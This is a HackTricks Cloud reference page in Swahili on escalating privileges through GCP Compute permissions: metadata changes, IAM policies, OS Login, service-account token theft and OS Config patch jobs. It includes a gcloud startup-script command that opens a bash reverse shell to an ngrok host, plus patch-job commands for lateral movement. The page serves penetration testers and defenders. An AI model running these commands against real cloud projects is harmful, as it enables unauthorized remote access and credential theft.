# GCP - Kubadilisha Mamlaka

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kubadilisha

Kwa habari zaidi kuhusu Kubadilisha na VPC (mtandao) katika GCP angalia:

{% content-ref url="../../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

{% hint style="danger" %}
Tambua kwamba ili kutekeleza mashambulizi yote ya kubadilisha mamlaka yanayohitaji kubadilisha metadata ya kifaa (kama kuongeza watumiaji wapya na funguo za SSH) **inahitajika uwe na ruhusa ya `actAs` juu ya SA iliyowekwa kwenye kifaa**, hata kama SA tayari imeunganishwa!
{% endhint %}

### `compute.projects.setCommonInstanceMetadata`

Kwa ruhusa hiyo unaweza **kubadilisha** **habari ya metadata** ya **kifaa** na kubadilisha **funguo zilizoidhinishwa za mtumiaji**, au **kuunda** **mtumiaji mpya mwenye ruhusa ya sudo**. Kwa hivyo, utaweza kutekeleza kupitia SSH kwenye kifaa chochote cha VM na kuiba Akaunti ya Huduma ya GCP ambayo Kifaa kinatumika nayo.\
Vikwazo:

* Tambua kwamba Akaunti za Huduma za GCP zinazoendesha kwenye visa vya VM kwa chaguo-msingi zina **wigo mdogo sana**
* Utahitaji kuwa **na uwezo wa kuwasiliana na seva ya SSH** ili kuingia

Kwa habari zaidi kuhusu jinsi ya kutumia ruhusa hii angalia:

{% content-ref url="gcp-add-custom-ssh-metadata.md" %}
[gcp-add-custom-ssh-metadata.md](gcp-add-custom-ssh-metadata.md)
{% endcontent-ref %}

Unaweza pia kutekeleza shambulizi hili kwa kuongeza script mpya ya kuanza na kuanzisha upya kifaa:
```bash
gcloud compute instances add-metadata my-vm-instance \
--metadata startup-script='#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18347 0>&1 &'

gcloud compute instances reset my-vm-instance
```
### `compute.instances.setMetadata`

Kibali hiki hutoa **madaraka sawa na kibali cha awali** lakini kwa mifano maalum badala ya mradi mzima. **Mbinu na vikwazo sawa kama kwa sehemu iliyopita inatumika**.

### `compute.instances.setIamPolicy`

Aina hii ya kibali itakuruhusu **kujipa jukumu lenye madaraka ya awali** na kukuza madaraka kwa kuvunja sheria hizo.

### **`compute.instances.osLogin`**

Ikiwa **OSLogin imeanzishwa kwenye mifano**, kwa kibali hiki unaweza tu kukimbia **`gcloud compute ssh [INSTANCE]`** na kuunganisha kwenye mfano. **Hautakuwa na madaraka ya msingi** ndani ya mfano.

{% hint style="success" %}
Ili kuingia kwa mafanikio na kibali hiki ndani ya mifano ya VM, unahitaji kuwa na kibali cha `iam.serviceAccounts.actAs` juu ya SA iliyowekwa kwenye VM.
{% endhint %}

### **`compute.instances.osAdminLogin`**

Ikiwa **OSLogin imeanzishwa kwenye mfano**, kwa kibali hiki unaweza tu kukimbia **`gcloud compute ssh [INSTANCE]`** na kuunganisha kwenye mfano. Utakuwa na **madaraka ya msingi** ndani ya mfano.

{% hint style="success" %}
Ili kuingia kwa mafanikio na kibali hiki ndani ya mifano ya VM, unahitaji kuwa na kibali cha `iam.serviceAccounts.actAs` juu ya SA iliyowekwa kwenye VM.
{% endhint %}

### `compute.instances.create`,`iam.serviceAccounts.actAs, compute.disks.create`, `compute.instances.create`, `compute.instances.setMetadata`, `compute.instances.setServiceAccount`, `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`

Inawezekana **kuunda mashine ya virtual na Akaunti ya Huduma iliyowekwa na kuiba token** ya akaunti ya huduma kwa kupata metadata kuongeza madaraka kwake.

Skripti ya kuvunja sheria kwa njia hii inaweza kupatikana [hapa](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py).

### `osconfig.patchDeployments.create` | `osconfig.patchJobs.exec`

Ikiwa una **`osconfig.patchDeployments.create`** au **`osconfig.patchJobs.exec`** kibali unaweza kuunda [**kazi au uanzishaji wa kurekebisha**](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching). Hii itakuruhusu kusonga kwa upande katika mazingira na kupata utekelezaji wa nambari kwenye mifano yote ya kompyuta ndani ya mradi.

Ikiwa unataka kuvunja hii kwa mikono utahitaji kuunda ama [kazi ya kurekebisha](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_job.json) au [uanzishaji](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_deployment.json) kwa kazi ya kurekebisha:

`gcloud compute os-config patch-jobs execute --file=patch.json`

Kwa kuanzisha uanzishaji wa kurekebisha:

`gcloud compute os-config patch-deployments create my-update --file=patch.json`

Zana za kiotomatiki kama [patchy](https://github.com/rek7/patchy) zipo kugundua vibali vya kulegea na kusonga kwa upande kiotomatiki.

**Unaweza pia kutumia hii kwa kudumu.**

### `compute.machineImages.setIamPolicy`

**Jipa madaraka ya ziada** kwa Picha ya Kompyuta.

### `compute.snapshots.setIamPolicy`

**Jipa madaraka ya ziada** kwa picha ya diski.

### `compute.disks.setIamPolicy`

**Jipa madaraka ya ziada** kwa diski.

### Pita Kupitia Viwango vya Kufikia

Kufuata kiungo hiki utapata [**mawazo ya jaribu kupita viwango vya ufikiaji**](../).

### Kupanda Daraja la Madaraka Kienyeji kwenye Mfano wa GCP Compute

{% content-ref url="../gcp-local-privilege-escalation-ssh-pivoting.md" %}
[gcp-local-privilege-escalation-ssh-pivoting.md](../gcp-local-privilege-escalation-ssh-pivoting.md)
{% endcontent-ref %}

## Marejeo

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
